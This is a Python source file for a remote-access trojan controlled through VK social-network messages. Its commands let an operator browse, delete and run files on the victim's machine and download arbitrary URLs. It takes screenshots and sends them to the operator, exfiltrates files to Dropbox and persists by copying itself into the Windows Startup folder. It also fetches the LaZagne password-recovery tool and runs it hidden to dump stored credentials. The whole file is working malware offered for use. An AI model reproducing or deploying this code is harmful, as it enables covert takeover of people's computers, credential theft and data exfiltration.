import re
import zipfile
import vk_api
import requests,time
import random
import os
import requests 
import wget
import time
import shutil
import dropbox
from mss import mss

def settings():
	global token
	global ID_developer
	global name
	global access_token
	with open('set.txt') as faile_settings:
		file = faile_settings.read()
		sp_fl = file.split(' ')
		#---------------------#
		try:
			name = sp_fl[1]
		except IndexError:
			name = 'Ошибка'	
		#---------------------#
		try:
			token = sp_fl[3]
		except IndexError:
			token = ' '
		#---------------------#
		try:
			ID_developer = sp_fl[5]
		except IndexError:
			ID_developer = ' '
		#---------------------#
		try:
			access_token = sp_fl[7]
		except IndexError:
			access_token = ' '
		#---------------------#	
##################################################################################################
def informations():
	with open("inf.txt",'r') as file_handler:
	    a = file_handler.read()
	    return a

def dir():
	global nome_derekt
	os.chdir(nome_derekt)
	dir_a = nome_derekt
	for x in os.listdir(path="."):
		dir_a+='\n'+str(x)
	return dir_a

def cd(go_to):
	global dir_histoei
	global nome_derekt
	os.chdir(str(go_to))
	dir_histoei += '\\ -- '+str(go_to) + '\\\n'
	nome_derekt  = str(go_to)
	#----------------------------#
	dir_a = str(go_to)+' ------\n'
	for x in os.listdir(path="."):
		dir_a+='\n'+str(x)
	return dir_a
	#----------------------------#

def open_file (name_open_file):
	os.system(str(name_open_file))
	return '+'

def remove_file(name):
	os.remove(str(name))
	return '+'

def remove_dir(name):
	os.rmdir(str(name))
	return '+'

def rm_dir_all(name):
	shutil.rmtree(str(name))
	return '+'

def wget_S(url):
	filename = wget.download(url)
	return filename

def uns_zip(filename):

	with zipfile.ZipFile(filename) as fantasy_zip:
		fantasy_zip.extractall()
	return fantasy_zip

def move_s(name_file,the_way):
	shutil.move(str(name_file), str(the_way))
	return '+'

def filr_create(name_file):
	faile_settings =  open(name_file,'w')
	faile_settings.close()
	return name_file

def filr_create_w(name_file,text):
	faile_settings =  open(name_file,'w')
	faile_settings.write(str(text))
	faile_settings.close()
	return name_file

def exit_bor():
	global cycle
	cycle = False
	return str(name) + '\n--- KO ---' 

def change_settings_r():
	with open('set.txt') as faile_settings:
		file = faile_settings.read()
		return file

def change_settings(text):
	with open('set.txt','w') as faile_settings:
		faile_settings.write(text)
	return str(text)

def skrin_s(id_source):
	with mss() as sct:
		photo = str((random.randint(1, 2147483647)))+'.png'
		filename = sct.shot(mon=-1, output=photo)
		a = vk.method("photos.getMessagesUploadServer")
		b = requests.post(a['upload_url'], files={'photo': open(photo, 'rb')}).json()
		c = vk.method('photos.saveMessagesPhoto', {'photo': b['photo'], 'server': b['server'], 'hash': b['hash']})[0]
		return c

def copy_s(name_file,name_end):
	shutil.copy(str(name_file),str(name_end))
	return '+'

def copy_avto(name):
	shutil.copy(str(name),'C:\\ProgramData\\Start Menu\\Programs\\Startup')

def install_lazagne():
	filename = wget.download('https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.2/lazagne.exe')
	with open('vbs_laz.vbs','w') as faile_settings:
		faile_settings.write('Set WShell = WScript.CreateObject("WScript.Shell")\nWShell.Run "laZagne.exe all -quiet -oA", 0')
	os.system('vbs_laz.vbs')
	return '+'

def copy_file(name):
	with open(str(name),mode= 'r',encoding = 'utf-8') as faile_settings:
		re_f = faile_settings.read()
	return re_f

def drop_box(file_from):
	global access_token
	file_to = '/Vk'+str(file_from)    
	dbx = dropbox.Dropbox(access_token)
	f = open(file_from, 'rb')
	meta = dbx.files_upload(f.read(), file_to, mode=dropbox.files.WriteMode("overwrite"))
	link = dbx.sharing_create_shared_link(file_to)
	url = link.url
	dl_url = re.sub(r"\?dl\=0", "?dl=1", url)
	return dl_url

##################################################################################################


def comand(data):
	global id_source
	data.pop(0)
	#_______________________________________________________________________________________________________________________________#
	if data == []:
		vk.method("messages.send", {"peer_id": id_source, "message":'Я', "random_id": random.randint(1, 2147483647)})
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'kil':
		vk.method("messages.send", {"peer_id": id_source, "message":exit_bor() , "random_id": random.randint(1, 2147483647)})
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'inf':
		global information
		vk.method("messages.send", {"peer_id": id_source, "message":information, "random_id": random.randint(1, 2147483647)})
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'dir':
		vk.method("messages.send", {"peer_id": id_source, "message":dir(), "random_id": random.randint(1, 2147483647)})
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'hom':
		global nome_derekt
		vk.method("messages.send", {"peer_id": id_source, "message":str(nome_derekt), "random_id": random.randint(1, 2147483647)})
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'cd':
		try:
			vk.method("messages.send", {"peer_id": id_source, "message":cd(data[1]), "random_id": random.randint(1, 2147483647)})
		except IndexError :
			global nome_derekt_except
			vk.method("messages.send", {"peer_id": id_source, "message":cd(nome_derekt_except), "random_id": random.randint(1, 2147483647)})
		except NotADirectoryError:
			vk.method("messages.send", {"peer_id": id_source, "message":'Это не папка', "random_id": random.randint(1, 2147483647)})
		except FileNotFoundError:
			vk.method("messages.send", {"peer_id": id_source, "message":'Такой папки нет', "random_id": random.randint(1, 2147483647)})
		except PermissionError:
				vk.method("messages.send", {"peer_id": id_source, "message":'Отказ в доступе' , "random_id": random.randint(1, 2147483647)})
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'open':
		try:
			vk.method("messages.send", {"peer_id": id_source, "message":open_file(data[1]), "random_id": random.randint(1, 2147483647)})
		except FileNotFoundError:
			vk.method("messages.send", {"peer_id": id_source, "message":'Такого файлы нет', "random_id": random.randint(1, 2147483647)})
		except IndexError :
			vk.method("messages.send", {"peer_id": id_source, "message":'Не указа путь' , "random_id": random.randint(1, 2147483647)})
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'rm-f':
		try:
			vk.method("messages.send", {"peer_id": id_source, "message":remove_file(data[1]), "random_id": random.randint(1, 2147483647)})
		except FileNotFoundError:
			vk.method("messages.send", {"peer_id": id_source, "message":'Такого файлы нет', "random_id": random.randint(1, 2147483647)})
		except PermissionError:
			vk.method("messages.send", {"peer_id": id_source, "message":'Это папка используйте - rm_dir', "random_id": random.randint(1, 2147483647)})
		except IndexError :
			vk.method("messages.send", {"peer_id": id_source, "message":'Не указа путь' , "random_id": random.randint(1, 2147483647)})
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'rm-d':
		try:
			vk.method("messages.send", {"peer_id": id_source, "message":remove_dir(data[1]), "random_id": random.randint(1, 2147483647)})
		except FileNotFoundError:
			vk.method("messages.send", {"peer_id": id_source, "message":'Такого файлы нет', "random_id": random.randint(1, 2147483647)})
		except NotADirectoryError:
			vk.method("messages.send", {"peer_id": id_source, "message":'Это файл исполльзуйте  - rm-fi', "random_id": random.randint(1, 2147483647)})
		except IndexError :
			vk.method("messages.send", {"peer_id": id_source, "message":'Не указа путь' , "random_id": random.randint(1, 2147483647)})
		except OSError:
			vk.method("messages.send", {"peer_id": id_source, "message":'Папка не пуста - для удлаения всего rm_dir_all' , "random_id": random.randint(1, 2147483647)})
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'rm-d-a':
		try:
			vk.method("messages.send", {"peer_id": id_source, "message":rm_dir_all(data[1]) , "random_id": random.randint(1, 2147483647)})
		except IndexError :
			vk.method("messages.send", {"peer_id": id_source, "message":'Не указа путь' , "random_id": random.randint(1, 2147483647)})
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'wget':
		try:
			vk.method("messages.send", {"peer_id": id_source, "message":wget_S(data[1]) , "random_id": random.randint(1, 2147483647)})
		except IndexError :
			vk.method("messages.send", {"peer_id": id_source, "message":'Не указа путь' , "random_id": random.randint(1, 2147483647)})
		except ValueError :
			vk.method("messages.send", {"peer_id": id_source, "message":'Не правильная сылка' , "random_id": random.randint(1, 2147483647)})

	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'unzip':
		try:
			vk.method("messages.send", {"peer_id": id_source, "message":uns_zip(data[1]) , "random_id": random.randint(1, 2147483647)})
		except IndexError :
			vk.method("messages.send", {"peer_id": id_source, "message":'Не указа путь' , "random_id": random.randint(1, 2147483647)})

		except :
			vk.method("messages.send", {"peer_id": id_source, "message":'Наверное это не архив' , "random_id": random.randint(1, 2147483647)})
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'move':
		try:
			vk.method("messages.send", {"peer_id": id_source, "message":move_s(data[1],data[2]) , "random_id": random.randint(1, 2147483647)})
		except PermissionError:
			vk.method("messages.send", {"peer_id": id_source, "message":'Отказ в доступе' , "random_id": random.randint(1, 2147483647)})
		except IndexError :
			vk.method("messages.send", {"peer_id": id_source, "message":'Не указа путь' , "random_id": random.randint(1, 2147483647)})
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'new-f':
		try:
			vk.method("messages.send", {"peer_id": id_source, "message":filr_create(data[1]) , "random_id": random.randint(1, 2147483647)})
		except PermissionError:
			vk.method("messages.send", {"peer_id": id_source, "message":'Отказ в доступе' , "random_id": random.randint(1, 2147483647)})
		except IndexError :
			vk.method("messages.send", {"peer_id": id_source, "message":'Не указа путь' , "random_id": random.randint(1, 2147483647)})
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'new-f-w':
		try:
			vk.method("messages.send", {"peer_id": id_source, "message":filr_create_w(data[1],data[2]) , "random_id": random.randint(1, 2147483647)})
		except IndexError :
			vk.method("messages.send", {"peer_id": id_source, "message":'Не указа путь' , "random_id": random.randint(1, 2147483647)})
		except FileNotFoundError:
			vk.method("messages.send", {"peer_id": id_source, "message":'Не указа формат txt' , "random_id": random.randint(1, 2147483647)})
		except TypeError :
			vk.method("messages.send", {"peer_id": id_source, "message":'Не указано что записать' , "random_id": random.randint(1, 2147483647)})			
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'his':
		global dir_histoei
		vk.method("messages.send", {"peer_id": id_source, "message":str(dir_histoei), "random_id": random.randint(1, 2147483647)})
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'his0':
		dir_histoei = 'None'
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'cr-inf':
		vk.method("messages.send", {"peer_id": id_source, "message":change_settings_r(), "random_id": random.randint(1, 2147483647)})
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'cr-write':
		try:
			vk.method("messages.send", {"peer_id": id_source, "message":change_settings(data[1]), "random_id": random.randint(1, 2147483647)})
		except IndexError :
			vk.method("messages.send", {"peer_id": id_source, "message":'Не указа путь' , "random_id": random.randint(1, 2147483647)})
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'skrin':
		c = skrin_s(id_source)
		vk.method("messages.send", {"peer_id": id_source, "attachment": f'photo{c["owner_id"]}_{c["id"]}',"random_id": random.randint(1, 2147483647)})
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'copy':
		try:
			vk.method("messages.send", {"peer_id": id_source, "message":copy_s(data[1],data[2]), "random_id": random.randint(1, 2147483647)})
		except IndexError :
			vk.method("messages.send", {"peer_id": id_source, "message":'Не указа путь' , "random_id": random.randint(1, 2147483647)})
		except PermissionError:
			vk.method("messages.send", {"peer_id": id_source, "message":'Отказ в доступе' , "random_id": random.randint(1, 2147483647)})
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'copy-a':
		try:
			vk.method("messages.send", {"peer_id": id_source, "message":copy_avto(data[1]), "random_id": random.randint(1, 2147483647)})
		except IndexError :
			vk.method("messages.send", {"peer_id": id_source, "message":'Не указа путь' , "random_id": random.randint(1, 2147483647)})
		except PermissionError:
			vk.method("messages.send", {"peer_id": id_source, "message":'Отказ в доступе' , "random_id": random.randint(1, 2147483647)})
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'in-laza':
		try:
			vk.method("messages.send", {"peer_id": id_source, "message":install_lazagne(), "random_id": random.randint(1, 2147483647)})
		except PermissionError:
			vk.method("messages.send", {"peer_id": id_source, "message":'Отказ в доступе' , "random_id": random.randint(1, 2147483647)})
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'copy-f-n':
		try:
			vk.method("messages.send", {"peer_id": id_source, "message":copy_file(data[1]), "random_id": random.randint(1, 2147483647)})
		except IndexError :
			vk.method("messages.send", {"peer_id": id_source, "message":'Не указа путь' , "random_id": random.randint(1, 2147483647)})
		except PermissionError:
			vk.method("messages.send", {"peer_id": id_source, "message":'Отказ в доступе' , "random_id": random.randint(1, 2147483647)})
		except:
			vk.method("messages.send", {"peer_id": id_source, "message":'Ошибка возможно файл слишком большой' , "random_id": random.randint(1, 2147483647)})
	#_______________________________________________________________________________________________________________________________#
	elif data[0] == 'save-d':
		try:
			vk.method("messages.send", {"peer_id": id_source, "message":drop_box(data[1]), "random_id": random.randint(1, 2147483647)})
		except IndexError :
			vk.method("messages.send", {"peer_id": id_source, "message":'Не указа путь' , "random_id": random.randint(1, 2147483647)})

	#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#	
	else:
		vk.method("messages.send", {"peer_id": id_source, "message":'Нет тако каманды - воспользуйтесь user##inf ' , "random_id": random.randint(1, 2147483647)})
	



##################################################################################################################

# ████─███─█───█─████─███─███
# █──█─█───██─██─█──█──█──█
# ████─███─█─█─█─█──█──█──███
# █─█──█───█───█─█──█──█──█
# █─█──███─█───█─████──█──███

# ████─████─████─███─███─███
# █──█─█──█─█──█─█───█───█
# ████─█────█────███─███─███
# █──█─█──█─█──█─█─────█───█
# █──█─████─████─███─███─███

# █─█─█──█
# █─█─█─█
# █─█─██
# ███─█─█
# ─█──█──█

##################################################################################################################

token = ''
ID_developer  = ''
name = ''
access_token = ''
nome_derekt = os.getcwd()
nome_derekt_except = os.getcwd()
dir_histoei = os.getcwd()

settings()
information = informations()

vk = vk_api.VkApi(token=token)
vk._auth_token()
cycle = True




while cycle:
    messages = vk.method("messages.getConversations", {"offset": 0, "count": 20, "filter": "unanswered"})
    if messages["count"] >= 1 :
    	#____________________________________________________________________________#
    	id_source = messages["items"][0]["last_message"]["from_id"] 
    	contact = messages["items"][0]["last_message"]["text"]
    	data_contact = contact.split('##')
    	#____________________________________________________________________________#
    	if str(id_source) == str(ID_developer) and data_contact[0] == 'user':
    		vk.method("messages.send", {"peer_id": id_source, "message":str(name)+' - Open' , "random_id": random.randint(1, 2147483647)})
    	elif str(id_source) == str(ID_developer) and str(data_contact[0]) == str(name):
	    	vk.method("messages.send", {"peer_id": id_source, "message":'||| ||| |||' , "random_id": random.randint(1, 2147483647)})
	    	body = messages["items"][0]["last_message"]["text"]
	    	data = body.split('##')
	    	comand(data)
    else:
    	time.sleep(2)



